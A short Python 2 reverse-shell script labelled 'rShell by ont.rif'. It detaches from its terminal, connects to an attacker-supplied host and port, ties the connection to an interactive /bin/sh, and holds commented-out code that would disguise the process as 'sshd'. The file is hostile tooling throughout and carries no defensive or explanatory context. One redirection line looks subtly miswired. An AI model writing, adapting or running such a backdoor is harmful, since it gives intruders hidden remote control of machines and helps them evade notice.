import sys, socket, os
try:
    host = str( sys.argv[1] )
    port = int( sys.argv[2] )
    #if os.fork() > 0: os._exit( 0 )
    if os.fork() > 0: os._exit( 0 )
    os.setsid()
    os.close( 0 )
    os.close( 1 )
    os.close( 2 )
    os.open( '/dev/null', os.O_RDONLY )
    os.open( '/dev/null', os.O_WRONLY|os.O_CREAT|os.O_APPEND )
    os.open( '/dev/null', os.O_WRONLY|os.O_CREAT|os.O_APPEND )
    sock = socket.socket( socket.AF_INET, socket.SOCK_STREAM )
    sock.connect( (host, port) )
    os.dup2( sock.fileno(), 0 )
    os.dup2( sock.fileno(), os.open( '/tmp/sock.txt', os.O_WRONLY|os.O_CREAT|os.O_APPEND ) )
    os.dup2( sock.fileno(), 2 )
    sock.sendall( ('\r\n>>>>>>>>>>>>>>> rShell by ont.rif >>>>>>>>>>>>>>\r\n') )
    #try:
    #    import dl
    #    libc = dl.open('/lib/libc.so.6')
    #    libc.call('prctl', 15, 'sshd\0', 0, 0, 0)
    #except:
    #    print "[!] can't set proc name...\r"
    os.execl( '/bin/sh', 'sh -i' )
except Exception, e:
    open( '/tmp/err.txt', 'a' ).write( str( e ) )
    os._exit( 1 )
